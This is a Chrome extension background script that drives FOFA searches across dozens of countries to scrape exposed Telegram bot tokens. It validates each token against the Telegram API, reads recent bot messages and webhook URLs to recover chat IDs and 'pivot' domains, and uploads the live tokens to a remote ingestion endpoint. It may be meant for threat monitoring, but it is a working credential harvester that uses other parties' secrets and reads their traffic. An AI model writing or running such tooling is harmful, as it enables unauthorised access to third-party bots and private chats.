// --- CONFIGURATION ---
const BASE_QUERY_TEMPLATE = 'body="api.telegram.org/bot"';
const COUNTRY_CODES = [
    "US", "CN", "HK", "RU", "FR", "DE", "NL", "SG", "GB", "JP",
    "KR", "IN", "BR", "CA", "AU", "IT", "ES", "TR", "UA", "VN",
    "ID", "PL", "SE", "CH", "NO", "FI", "DK", "IE", "AT", "CZ",
    "RO", "ZA", "MX", "AR", "CO", "CL", "MY", "TH", "PH", "PK",
    "IR", "SA", "AE", "IL", "GR", "PT", "BE", "HU", "NZ"
];

// Max tokens kept in state.results to avoid hitting the 5 MB
// chrome.storage.local limit. Oldest entries are dropped when exceeded.
const MAX_STORED_RESULTS = 300;

// Max concurrent getMe validation calls (keeps Telegram rate-limit happy)
const VALIDATE_CONCURRENCY = 5;

// --- STATE ---
let state = {
    isRunning: false,
    isPaused: false,
    status: "Ready",
    query: BASE_QUERY_TEMPLATE,
    domain: "en.fofa.info",
    domainMode: "en",        // "en" | "cn" | "both"
    domainPhase: 1,          // 1 = first domain, 2 = second domain (both mode only)
    countryIndex: 0,
    countriesDone: 0,
    resultsFound: 0,
    resultsValid: 0,
    results: [],
    seenTokens: new Set(),
    countryList: [],
};

loadState();

let activeTabId = null;

// --- LISTENERS ---
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    switch (msg.action) {
        case "GET_STATE":
            sendResponse(serializeState(state));
            return false;
        case "START_SCAN":
            startScan(msg.query, msg.domain, msg.domainMode);
            break;
        case "STOP_SCAN":
            stopScan("Stopped by user");
            break;
        case "RESUME_SCAN":
            resumeScan();
            break;
        case "UPLOAD_RESULTS":
            uploadToSupabase();
            break;
        case "CAPTCHA_DETECTED":
            pauseScan("⚠️ Captcha Detected!");
            break;
        case "LOGIN_REQUIRED":
            pauseScan("🔒 Login required — log into FOFA then click Resume");
            break;
        case "RESULTS_FOUND":
            // Batch: msg.data is an array of {token, chatId} objects
            handleResults(msg.data || []);
            break;
        case "PAGE_COMPLETE":
            nextCountry();
            break;
        case "LOG":
            console.log("[Content]", msg.message);
            break;
    }
    return false;
});

// --- PERSISTENCE ---

function saveState() {
    const storageState = {
        ...state,
        seenTokens: Array.from(state.seenTokens),
    };
    chrome.storage.local.set({ scraper_state: storageState }, () => {
        if (chrome.runtime.lastError) {
            console.warn("[BG] saveState failed:", chrome.runtime.lastError.message);
            // Storage full — trim results and retry once
            if (state.results.length > 50) {
                state.results = state.results.slice(-50);
                const trimmed = { ...storageState, results: state.results };
                chrome.storage.local.set({ scraper_state: trimmed }, () => {
                    if (chrome.runtime.lastError) {
                        console.error("[BG] saveState retry failed — state not persisted");
                    }
                });
            }
        }
    });
}

function loadState() {
    chrome.storage.local.get(["scraper_state"], (result) => {
        if (result.scraper_state) {
            const loaded = result.scraper_state;
            loaded.seenTokens = loaded.seenTokens
                ? new Set(loaded.seenTokens)
                : new Set();
            // Guard: countryList must exist and be consistent with countryIndex.
            // Service worker restarts can reload an old state where countryList
            // is missing or shorter than countryIndex — realign here.
            if (
                !Array.isArray(loaded.countryList) ||
                loaded.countryList.length === 0 ||
                loaded.countryIndex >= loaded.countryList.length
            ) {
                loaded.countryList = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);
                loaded.countryIndex = 0;
            }
            // Mark as stopped if it was mid-run when the SW died
            if (loaded.isRunning && !loaded.isPaused) {
                loaded.isRunning = false;
                loaded.status = "Stopped (Recovered)";
            }
            state = loaded;
        }
    });
}

function serializeState(s) {
    // Return a plain object — Sets are not serialisable via sendMessage
    return { ...s, seenTokens: Array.from(s.seenTokens) };
}

// --- CORE LOGIC ---

async function startScan(userQuery, userDomain, userDomainMode) {
    if (state.isRunning) return;

    const shuffled = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);

    // Resolve domain from mode
    const mode   = userDomainMode || "en";
    const domain = mode === "cn" ? "fofa.info" : "en.fofa.info";

    state.isRunning      = true;
    state.isPaused       = false;
    state.status         = "Starting...";
    state.query          = userQuery || BASE_QUERY_TEMPLATE;
    state.domainMode     = mode;
    state.domainPhase    = 1;
    state.domain         = domain;
    state.countryIndex   = 0;
    state.countriesDone  = 0;
    state.resultsFound   = 0;
    state.resultsValid   = 0;
    state.results        = [];
    state.seenTokens     = new Set();
    state.countryList    = shuffled;

    saveState();

    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab) { stopScan("No active tab found"); return; }
    activeTabId = tab.id;

    chrome.alarms.create("watchdog", { periodInMinutes: 2 });

    broadcastState();
    processNextCountry();
}

function stopScan(reason) {
    state.isRunning = false;
    state.isPaused  = false;
    state.status    = reason || "Stopped";
    chrome.alarms.clearAll();
    if (activeTabId) {
        chrome.tabs.sendMessage(activeTabId, { action: "STOP_WORK" }).catch(() => {});
    }
    saveState();
    broadcastState();
}

function pauseScan(reason) {
    state.isPaused = true;
    state.status   = reason || "Paused";
    saveState();
    broadcastState();
}

function resumeScan() {
    if (!state.isRunning && state.status !== "Stopped (Recovered)") return;
    if (!state.isRunning) state.isRunning = true;
    state.isPaused = false;
    state.status   = "Resuming...";
    saveState();
    broadcastState();

    chrome.tabs.query({ active: true, currentWindow: true }).then(([tab]) => {
        if (tab) {
            activeTabId = tab.id;
            chrome.tabs.sendMessage(activeTabId, { action: "RESUME_WORK" }).catch(() => {
                processNextCountry(false);
            });
        } else {
            stopScan("Could not find active tab to resume");
        }
    });
}

function nextCountry() {
    state.countryIndex++;
    state.countriesDone++;
    saveState();
    processNextCountry();
}

async function processNextCountry() {
    if (!state.isRunning || state.isPaused) return;

    // Guard: realign if countryList missing after SW restart
    if (!Array.isArray(state.countryList) || state.countryList.length === 0) {
        state.countryList  = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);
        state.countryIndex = 0;
    }

    if (state.countryIndex >= state.countryList.length) {
        // "both" mode: after EN phase, automatically continue on CN (or vice versa)
        if (state.domainMode === "both" && state.domainPhase === 1) {
            const nextDomain = "fofa.info";
            const shuffled   = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);
            state.domainPhase  = 2;
            state.domain       = nextDomain;
            state.countryIndex = 0;
            state.countryList  = shuffled;
            state.status = `✅ EN done — switching to CN (fofa.info)...`;
            saveState();
            broadcastState();
            // Small pause so the user sees the transition message
            await new Promise(r => setTimeout(r, 1500));
            processNextCountry();
            return;
        }
        stopScan("✅ Scan Complete!");
        await uploadToSupabase();
        return;
    }

    const country = state.countryList[state.countryIndex];
    const phaseLabel = state.domainMode === "both"
        ? ` [${state.domainPhase === 1 ? "EN" : "CN"} ${state.countriesDone + 1}/${state.countryList.length}]`
        : ` (${state.countriesDone + 1}/${state.countryList.length})`;
    state.status = `Scanning: ${country}${phaseLabel}`;
    saveState();
    broadcastState();

    const fullQuery  = `${state.query} && country="${country}"`;
    const encoded    = btoa(fullQuery);
    const targetUrl  = `https://${state.domain}/result?qbase64=${encoded}`;

    await chrome.tabs.update(activeTabId, { url: targetUrl });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (
        tabId === activeTabId &&
        changeInfo.status === "complete" &&
        state.isRunning &&
        !state.isPaused
    ) {
        chrome.alarms.create("scrape_page", { delayInMinutes: 0.083 }); // ~5s — Vue needs time to hydrate after DOM complete
    }
});

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "scrape_page") {
        if (!state.isRunning || state.isPaused || !activeTabId) return;
        chrome.tabs.sendMessage(activeTabId, { action: "SCRAPE_PAGE" }).catch((err) => {
            console.log("SCRAPE_PAGE send failed:", err);
            nextCountry();
        });
    }

    if (alarm.name === "watchdog") {
        if (state.isRunning && !state.isPaused && activeTabId) {
            chrome.tabs.get(activeTabId, (tab) => {
                if (chrome.runtime.lastError || !tab) {
                    stopScan("Tab closed — scan stopped");
                    return;
                }
                if (tab.status === "complete") {
                    chrome.tabs.sendMessage(activeTabId, { action: "SCRAPE_PAGE" }).catch(() => {
                        nextCountry();
                    });
                }
            });
        }
    }
});

// --- VALIDATION ---

async function validateToken(data) {
    const token   = data.token;
    const baseUrl = `https://api.telegram.org/bot${token}`;

    try {
        const meRes  = await fetch(`${baseUrl}/getMe`);
        const meJson = await meRes.json();

        if (!meJson.ok) {
            data.valid  = false;
            data.status = "Invalid/Revoked";
            return data;
        }

        data.valid        = true;
        data.bot_name     = meJson.result.username;
        data.bot_id       = meJson.result.id;
        data.botUsername  = meJson.result.username;

        // --- chat_id resolution: three sources in priority order ---

        // 1. getUpdates — recent messages contain chat context
        if (!data.chatId) {
            try {
                const upRes  = await fetch(`${baseUrl}/getUpdates?limit=10&allowed_updates=["message","channel_post","my_chat_member","chat_member"]`);
                const upJson = await upRes.json();
                if (upJson.ok && upJson.result) {
                    for (const update of upJson.result) {
                        const chat =
                            (update.message        && update.message.chat)        ||
                            (update.channel_post   && update.channel_post.chat)   ||
                            (update.my_chat_member && update.my_chat_member.chat) ||
                            (update.chat_member    && update.chat_member.chat);
                        if (chat) {
                            data.chatId    = chat.id;
                            data.chatType  = chat.type;
                            data.chatTitle = chat.title || chat.username || chat.first_name;
                            break;
                        }
                    }
                }
            } catch (_) {}
        }

        // 2. getWebhookInfo — webhook URL often contains chat_id or a pivot domain
        if (!data.chatId) {
            try {
                const whRes  = await fetch(`${baseUrl}/getWebhookInfo`);
                const whJson = await whRes.json();
                if (whJson.ok && whJson.result) {
                    const whUrl = whJson.result.url || "";
                    data.webhookUrl = whUrl || null;

                    // Extract chat_id embedded in common webhook URL patterns:
                    // e.g. /send?chat_id=-100123, /notify/123456789, ?cid=-100...
                    const cidMatch = whUrl.match(/[?&/](?:chat_id|cid|chatid|target)[=\/](-?\d{5,20})/i);
                    if (cidMatch) {
                        data.chatId   = cidMatch[1];
                        data.chatType = "webhook_extracted";
                    }

                    // Even without a chat_id, a non-empty webhook URL is a
                    // high-value pivot point — record it for the backend pivot tasks
                    if (whUrl && !data.webhookDomain) {
                        try {
                            data.webhookDomain = new URL(whUrl).hostname;
                        } catch (_) {}
                    }
                }
            } catch (_) {}
        }

        // 3. getChat on common supergroup ID patterns — last resort, rarely useful
        // (skipped — too slow and mostly fails without a known chat_id seed)

        return data;
    } catch (_) {
        data.valid  = false;
        data.status = "Network/Error";
        return data;
    }
}

// Validate a batch of raw token objects concurrently (capped at VALIDATE_CONCURRENCY)
async function validateBatch(rawItems) {
    const results = [];
    // Process in chunks of VALIDATE_CONCURRENCY
    for (let i = 0; i < rawItems.length; i += VALIDATE_CONCURRENCY) {
        const chunk     = rawItems.slice(i, i + VALIDATE_CONCURRENCY);
        const validated = await Promise.all(chunk.map((item) => validateToken(item)));
        results.push(...validated);
    }
    return results;
}

// Handle a batch of results arriving from content.js
async function handleResults(items) {
    if (!state.isRunning && state.status !== "Paused") return;

    // Dedup against already-seen tokens
    const newItems = items.filter((d) => {
        if (!d.token || state.seenTokens.has(d.token)) return false;
        state.seenTokens.add(d.token);
        return true;
    });

    if (newItems.length === 0) return;

    state.status = `Validating ${newItems.length} token(s)...`;
    broadcastState();

    const validated = await validateBatch(newItems);

    for (const v of validated) {
        // Cap stored results to avoid blowing chrome.storage.local 5 MB limit
        if (state.results.length >= MAX_STORED_RESULTS) {
            state.results.shift(); // drop oldest
        }
        state.results.push(v);
        state.resultsFound++;
        if (v.valid) state.resultsValid++;
        console.log("🦅 CREDENTIAL:", v.valid ? "✅" : "❌", v.token.slice(0, 12) + "...", v.bot_name || "");
    }

    saveState();
    broadcastState();
}

function broadcastState() {
    chrome.runtime.sendMessage({ action: "STATE_UPDATE", state: serializeState(state) }).catch(() => {});
}

// --- SUPABASE UPLOAD ---
// Always routes via the API endpoint (server-side Fernet encryption).
// Direct Supabase write removed — it stored raw plaintext tokens with no
// encryption path, creating a permanent security hole in the DB.

async function uploadToSupabase() {
    const validResults = (state.results || []).filter((r) => r.valid === true);
    if (validResults.length === 0) {
        state.status = "⚠️ Nothing to upload (no valid tokens)";
        saveState();
        broadcastState();
        return;
    }

    const cfg = await new Promise((resolve) => {
        chrome.storage.sync.get(["supabase_config"], (r) => resolve(r.supabase_config || {}));
    });

    const apiUrl          = (cfg.apiUrl          || "").trim().replace(/\/+$/, "");
    const monitorKey      = (cfg.monitorKey       || "").trim();

    if (!apiUrl) {
        state.status = "⚠️ Upload skipped — set API URL in settings";
        saveState();
        broadcastState();
        return;
    }

    state.status = `⬆️ Uploading ${validResults.length} tokens via API...`;
    saveState();
    broadcastState();

    const payload = {
        source:  "extension",
        domain:  state.domain,
        query:   state.query,
        results: validResults.map((r) => ({
            token:        r.token,
            chat_id:      r.chatId        || null,
            chat_name:    r.chatTitle      || null,
            chat_type:    r.chatType       || null,
            bot_id:       r.bot_id         ? String(r.bot_id) : null,
            bot_username: r.botUsername    || r.bot_name || null,
            valid:        r.valid,
            meta: {
                domain:         state.domain,
                query:          state.query,
                webhook_url:    r.webhookUrl    || null,
                webhook_domain: r.webhookDomain || null,
            },
        })),
    };

    const headers = { "Content-Type": "application/json" };
    if (monitorKey) headers["X-Monitor-Key"] = monitorKey;

    try {
        const controller = new AbortController();
        const timeout    = setTimeout(() => controller.abort(), 20000);
        const res = await fetch(`${apiUrl}/ingest/extension/credentials`, {
            method:  "POST",
            headers,
            body:    JSON.stringify(payload),
            signal:  controller.signal,
        });
        clearTimeout(timeout);

        if (res.ok) {
            const data   = await res.json().catch(() => ({}));
            state.status = `✅ Uploaded: ${data.inserted || 0} new, ${data.updated || 0} updated, ${data.skipped || 0} skipped`;
        } else {
            const text   = await res.text().catch(() => "");
            state.status = `❌ Upload failed (HTTP ${res.status}) — check API URL & monitor key`;
            console.warn("Upload failed:", res.status, text);
        }
    } catch (e) {
        state.status = `❌ Upload error: ${e.message}`;
        console.warn("Upload exception:", e);
    }

    saveState();
    broadcastState();
}
